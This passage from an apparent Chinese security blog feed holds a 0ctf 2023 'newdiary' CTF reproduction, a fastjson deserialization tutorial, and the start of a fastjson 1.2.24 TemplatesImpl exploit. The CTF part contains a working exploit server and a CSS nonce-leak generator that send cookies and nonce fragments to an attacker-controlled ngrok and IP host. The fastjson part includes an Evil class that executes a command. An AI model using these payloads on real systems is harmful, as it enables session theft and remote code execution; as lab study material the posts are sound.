class="string">f&quot;&quot;&quot;&lt;iframe name=asd srcdoc=&quot;&lt;script nonce=<span class="subst">&#123;nonce&#125;</span>&gt;top.location=&#x27;<span class="subst">&#123;ngrok_url&#125;</span>flag?flag=&#x27;+encodeURI(document[&#x27;cookie&#x27;])&lt;/script&gt;&quot;/&gt;&quot;&quot;&quot;</span></span><br><span class="line">    r = s.post(url + <span class="string">&#x27;/write&#x27;</span>, data=&#123;<span class="string">&#x27;title&#x27;</span>:<span class="string">&#x27;pwning&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: script&#125;)</span><br><span class="line">    share(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report</span>():</span><br><span class="line">    r = s.get(url + <span class="string">&#x27;/report?id=0&amp;username=&#x27;</span> + user)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    r = s.get(url + <span class="string">&#x27;/logout&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/exploit&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">test=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">global</span> user</span><br><span class="line">    user = <span class="string">&#x27;pwn&#x27;</span>+<span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">1000000</span>))</span><br><span class="line">    logout()</span><br><span class="line">    login()</span><br><span class="line">    write_zero_note()</span><br><span class="line">    write_first_note()</span><br><span class="line">    <span class="keyword">if</span> (test == <span class="literal">False</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;reporting...&quot;</span>)</span><br><span class="line">        report()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;exploit for &quot;</span>+user+<span class="string">&quot; done&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    flag = request.args.get(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> flag <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag: &quot;</span> + flag)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You have been pwned&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Pls give me flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    x = request.args.get(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> x <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;x: &quot;</span> + x)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;current nonce_substr: &quot;</span> + <span class="built_in">str</span>(nonce_substr))</span><br><span class="line">        nonce_substr.add(x)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(nonce_substr) &gt;= <span class="number">30</span>:</span><br><span class="line">            nonce = retrieveNonce()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;nonce: &quot;</span> + nonce)</span><br><span class="line">            create_script_nonce(nonce)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, USERNAME=user)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Public URL:&#x27;</span>, ngrok_url)</span><br><span class="line">        app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;aborting&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
<p>templates有index.html<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> <span class="title function_">sleep</span> = (<span class="params">milliseconds</span>) =&gt; <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, milliseconds));</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">run</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            bot_window = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;http://localhost/share/read#id=1&amp;username=&#123;&#123;USERNAME&#125;&#125;&quot;</span>); <span class="comment">// Exploit 1, leak nonce</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">7000</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            bot_window.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;http://localhost/share/read#id=2&amp;username=&#123;&#123;USERNAME&#125;&#125;&quot;</span>; <span class="comment">// Exploit 2, leak cookie</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">100</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;O&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">run</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这里分别share两个页面,时间间隔7s差不多nonce已经计算完成</p>
<p>生成css的脚本:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">charset = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line">perms = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="string">&quot;&quot;</span>.join, itertools.product(charset, repeat=<span class="number">3</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;leak.css&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(perms):</span><br><span class="line">        f.write(</span><br><span class="line">            <span class="string">f&quot;&quot;&quot;:has(script[nonce*=&quot;<span class="subst">&#123;x&#125;</span>&quot;])&#123;&#123;--tosend-<span class="subst">&#123;x&#125;</span>: url(http://10.27.179.134:5000/?x=<span class="subst">&#123;x&#125;</span>);&#125;&#125;&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;loading&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> perms:</span><br><span class="line">        data += <span class="string">f&quot;var(--tosend-<span class="subst">&#123;x&#125;</span>, none),&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;writing&quot;</span>)</span><br><span class="line"></span><br><span class="line">    f.write((<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">input&#123;</span></span><br><span class="line"><span class="string">background: %s</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % data[:-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure></p>
<p>这题的CSP策略是:<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;nonce-&lt;%= nonce %&gt;&#x27;; frame-src &#x27;none&#x27;; object-src &#x27;none&#x27;; base-uri &#x27;self&#x27;; style-src &#x27;unsafe-inline&#x27; https://unpkg.com&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这里要上传到<a href="https://unpkg.com上,要先去npm官网注册一个账号,然后本地空的文件夹">https://unpkg.com上,要先去npm官网注册一个账号,然后本地空的文件夹</a>:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm init</span><br><span class="line">一直回车</span><br><span class="line">编写package.json,包名不能和别人发布的包名重复</span><br><span class="line">npm login</span><br><span class="line">npm public</span><br></pre></td></tr></table></figure><br>然后npm官网可以查看到自己发布的包<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240321133634.png" alt="image.png"></p>
<p>exp脚本直接访问/exp即可:<br>会先调用/write写重定向页面,泄露nonce的脚本,然后<code>http://10.27.179.134:5000/?x=&#123;x&#125;</code>会不断发给本地开启flask的机器,本地的/路由会收集nonce片段,最终得到完成的nonce,然后写bot带出flag的页面(id=2的页面),此时index.html的休眠7秒也差不多结束了,开始share这个新写的页面超过用nonce值绕过csp带出flag</p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240321134024.png" alt="image.png"></p>
<p>参考<br><a href="https://github.com/salvatore-abello/CTF-Writeups/tree/main/0ctf%20-%202023/newdiary">CTF-Writeups/0ctf - 2023/newdiary at main ·salvatore-abello/CTF-Writeups ·GitHub上</a></p>
]]></content>
      <categories>
        <category>题目复现</category>
      </categories>
      <tags>
        <tag>题目复现</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson篇1-基础用法</title>
    <url>/2024/03/26/fastjson%E7%AF%871-%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p>Fastjson 是 Alibaba 开发的 Java 语言编写的高性能 JSON 库，用于将数据在 JSON 和 Java Object 之间互相转换。</p>
<p>两个接口:</p>
<ol>
<li><code>JSON.toJSONString</code> 将 Java 对象转换为 json 对象，序列化的过程。</li>
<li><code>JSON.parseObject/JSON.parse</code> 将 json 对象重新变回 Java 对象；反序列化的过程</li>
</ol>
<p>poe.xml<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-dbcp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>先定义一个Student类,方便后面使用:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">    <span class="keyword">private</span> Properties properties;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAddress&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getProperties&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> properties;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>几个参数:</p>
<h3 id="SerializerFeature-WriteClassName"><a href="#SerializerFeature-WriteClassName" class="headerlink" title="SerializerFeature.WriteClassName"></a>SerializerFeature.WriteClassName</h3><p>JSON.toJSONString()中的一个设置属性值，设置之后在序列化的时候会多写入一个@type，即写上被序列化的类名，type可以指定反序列化的类，并且调用其getter/setter/is方法</p>
<h3 id="Feature-SupportNonPublicField"><a href="#Feature-SupportNonPublicField" class="headerlink" title="Feature.SupportNonPublicField"></a>Feature.SupportNonPublicField</h3><p>如果需要还原出private属性的话，还需要在JSON.parseObject/JSON.parse中加上Feature.SupportNonPublicField参数</p>
<p>test:<br>需要先在Student类里加个setAge方法来测试,测完注释掉<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializeConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Student student=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.setName(<span class="string">&quot;jmx0hxq&quot;</span>);</span><br><span class="line">        student.setAge(<span class="number">19</span>);</span><br><span class="line">        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteClassName));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAddress</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">getProperties</span><br><span class="line">&#123;&quot;@type&quot;:&quot;Student&quot;,&quot;age&quot;:19,&quot;name&quot;:&quot;jmx0hxq&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>还原private属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:19,\&quot;name\&quot;:\&quot;jmx0hxq\&quot;,\&quot;address\&quot;:\&quot;china\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString, Student.class,Feature.SupportNonPublicField);</span><br><span class="line">        <span class="comment">// 或以下语句，输出结果一致</span></span><br><span class="line">        <span class="comment">//JSONObject obj = JSON.parseObject(jsonString);</span></span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">        System.out.println(((Student) obj).getAddress());</span><br><span class="line">        System.out.println(((Student) obj).getAge());</span><br><span class="line">        System.out.println(((Student) obj).getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">Student@4b9af9a9</span><br><span class="line">Student</span><br><span class="line">getAddress</span><br><span class="line">china</span><br><span class="line">getAge</span><br><span class="line">19</span><br><span class="line">getName</span><br><span class="line">jmx0hxq</span><br></pre></td></tr></table></figure></p>
<p>如果不加Feature.SupportNonPublicField属性,则无法得到私有属性结果就是:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Object obj = JSON.parseObject(jsonString, Student.class);</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">Student@4b9af9a9</span><br><span class="line">Student</span><br><span class="line">getAddress</span><br><span class="line">null</span><br><span class="line">getAge</span><br><span class="line">0</span><br><span class="line">getName</span><br><span class="line">jmx0hxq</span><br></pre></td></tr></table></figure>
<p>如果不加Student.class,则无法成功反序列化为Student类,而是JSONObject类:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Object obj = JSON.parseObject(jsonString);</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getAddress</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">getProperties</span><br><span class="line">&#123;&quot;name&quot;:&quot;jmx0hxq&quot;,&quot;age&quot;:0&#125;</span><br><span class="line">com.alibaba.fastjson.JSONObject</span><br><span class="line">Exception in thread &quot;main&quot; java.lang.ClassCastException: com.alibaba.fastjson.JSONObject cannot be cast to Student</span><br><span class="line">	at test1.main(test1.java:12)</span><br></pre></td></tr></table></figure>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><ul>
<li><p>当反序列化为<code>JSON.parseObject(*)</code>形式,即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法(==这里是因为private属性的变量不应该有set方法,如果自己加个set方法可以发现是会调用的,如果调用了自己设置的set方法,那反序列化的时候即使不加Feature.SupportNonPublicField也能得到它的值==)，其中properties属性的getter方法会被调用两次</p>
</li>
<li><p>当反序列化为<code>JSON.parseObject(*,*.class)</code>形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法(==这里是因为private属性的变量不应该有set方法,如果自己加个set方法可以发现是会调用的,如果调用了自己设置的set方法,那反序列化的时候即使不加Feature.SupportNonPublicField也能得到它的值==)、properties属性的getter方法；</p>
</li>
<li><p>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即<code>JSON.parseObject(*,*.class)</code>形式得到的都是特定的Student类；</p>
</li>
</ul>
<h3 id="parse和parseObject的区别"><a href="#parse和parseObject的区别" class="headerlink" title="parse和parseObject的区别"></a>parse和parseObject的区别</h3><p>主要的区别就是<code>parseObject()</code>返回的是JSONObject,而<code>parse()</code>返回的是实际类型的对象<br>上面的代码我们直接<code>Object obj = JSON.parse(jsonString);</code>就可以得到<code>Object obj = JSON.parseObject(jsonString, Student.class);</code>一样的结果</p>
<p>这里参考drun1baby师傅的博客解释:</p>
<blockquote>
<p><code>parseObject()</code> 会额外的将Java对象转为 JSONObject对象，即 <code>JSON.toJSON()</code>。所以进行反序列化时的细节区别在于，<code>parse()</code> 会识别并调用目标类的 <code>setter</code> 方法及某些特定条件的 <code>getter</code> 方法，而 <code>parseObject()</code> 由于多执行了 <code>JSON.toJSON(obj)</code>，所以在处理过程中会调用反序列化目标类的所有 <code>setter</code> 和 <code>getter</code> 方法。</p>
</blockquote>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>fastjson 在反序列化的时候会去找我们在 <code>@type</code> 中规定的类是哪个类，然后在反序列化的时候会自动调用这些 setter 与 getter 方法和构造函数的调用<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">满足条件的setter：</span><br><span class="line">- 非静态函数</span><br><span class="line">- 返回类型为void或当前类</span><br><span class="line">- 参数个数为1个</span><br><span class="line"></span><br><span class="line">满足条件的getter：</span><br><span class="line">- 非静态方法</span><br><span class="line">- 无参数</span><br><span class="line">- 返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</span><br></pre></td></tr></table></figure><br>如果这些函数有危险函数则可以造成漏洞</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
<li><a href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/">https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/</a></li>
<li><a href="https://github.com/Y4tacker/JavaSec">Y4tacker/JavaSec: a rep for documenting my study, may be from 0 to 0.1 (github.com)</a></li>
</ol>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson篇2-漏洞复现和版本绕过</title>
    <url>/2024/03/27/fastjson%E7%AF%872-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h3><h4 id="基于TemplatesImpl的利用链"><a href="#基于TemplatesImpl的利用链" class="headerlink" title="基于TemplatesImpl的利用链"></a>基于TemplatesImpl的利用链</h4><p>这个链子和CC3有点像,Java动态加载字节码<br>当时CC3是:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#newTransformer()-&gt;TemplatesImpl#getTransletInstance()-&gt;....</span><br></pre></td></tr></table></figure><br>但是getTransletInstance()不符合fastjson反序列化调用get方法的要求,它返回的是一个抽象类AbstractTranslet<code>因此寻找谁调用的</code>TemplatesImpl#newTransformer()<code>找到</code>getOutputProperties()`方法,符合要求<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getOutputProperties()  ---&gt; newTransformer() ---&gt; TransformerImpl(getTransletInstance(), _outputProperties,  </span><br><span class="line"> _indentNumber, _tfactory);</span><br></pre></td></tr></table></figure></p>
<p>Evil.java<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>javac编译</p>
<p>Exp:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TemplatesImpl 链子的 EXP</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">study1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClass</span><span class="params">(String cls)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(cls));</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> bytesRead;</span><br><span class="line">            <span class="keyword">while</span> ((bytesRead = fis.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                bos.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">            fis.close();</span><br><span class="line">            <span class="keyword">return</span> Base64.getEncoder().encodeToString(bos.toByteArray());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// or handle the error appropriately</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ParserConfig</span> <span class="variable">config</span> <span 